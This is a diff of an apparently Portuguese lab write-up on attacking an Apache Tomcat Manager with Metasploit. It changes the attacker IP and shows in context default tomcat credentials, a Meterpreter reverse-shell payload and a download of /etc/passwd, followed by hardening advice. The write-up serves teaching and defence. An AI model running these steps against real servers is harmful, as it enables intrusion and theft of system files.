@@ -72,7 +72,7 @@ nmap -sV -sC -O 192.168.0.60
 
 ```bash
 ifconfig
-# IP do atacante: 172.24.101.240
+# IP do atacante: 192.168.0.61
 ```
 
 - Essa etapa é mostrada na imagem `msfconsole_1.png`.
@@ -111,7 +111,7 @@ set RPORT 8180
 set HTTPUSERNAME tomcat
 set HTTPPASSWORD tomcat
 set PAYLOAD java/meterpreter/reverse_tcp
-set LHOST 172.24.101.240   # IP da VM Kali (bridge)
+set LHOST 192.168.0.61   # IP da VM Kali (bridge)
 set LPORT 4444
 run
 ```
@@ -155,6 +155,7 @@ meterpreter > download /etc/passwd
   - Manter servidores e frameworks web **atualizados**.
   - Restringir acesso ao Tomcat Manager a IPs confiáveis ou VPN.
   - Monitorar logs para detectar tentativas de upload e acessos suspeitos.
+
 
 
 
